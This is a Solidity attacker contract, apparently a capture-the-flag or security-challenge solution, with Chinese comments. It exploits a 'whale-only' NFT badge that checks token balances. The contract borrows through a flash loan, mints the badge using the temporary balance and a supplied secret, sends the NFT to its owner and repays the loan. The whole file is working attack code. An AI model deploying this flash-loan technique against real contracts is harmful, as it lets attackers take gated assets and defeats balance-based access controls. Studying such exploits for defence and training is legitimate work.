// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {IFlashLoanReceiver} from "./interfaces/IFlashLoanReceiver.sol";

interface INo2WhaleOnlyBadge { 
    function obtainProofOfWhale(uint256) external;
    function currentId() external view returns (uint256);
    function transferFrom(address from, address to, uint256 tokenId) external;
}

contract WhaleBadgeFlashloanAttacker is IFlashLoanReceiver {
    address public flashloan;
    address public whalebadge;
    address public token;
    address public owner;

    constructor(address _flashloan, address _whalebadge, address _token) {
        flashloan = _flashloan;
        whalebadge = _whalebadge;
        token = _token;
        owner = msg.sender;
    }

    function attack(uint256 amount, uint256 secret) external {
        require(msg.sender == owner, "only owner");
        bytes memory params = abi.encode(secret);
        (bool ok,) = flashloan.call(abi.encodeWithSignature("flashloan(uint256,bytes)", amount, params));
        require(ok, "flashloan failed");
    }

    function executeOperation(
        address _token,
        uint256 amount,
        uint256,
        bytes calldata params
    ) external override {
        require(msg.sender == flashloan, "not flashloan");
        uint256 secret = abi.decode(params, (uint256));
        
        // 鑄造 NFT
        INo2WhaleOnlyBadge(whalebadge).obtainProofOfWhale(secret);

        // 取得最新 tokenId 並轉給 owner
        uint256 tokenId = INo2WhaleOnlyBadge(whalebadge).currentId();
        INo2WhaleOnlyBadge(whalebadge).transferFrom(address(this), owner, tokenId);

        // 還款
        IERC20(_token).transfer(flashloan, amount);
    }
} 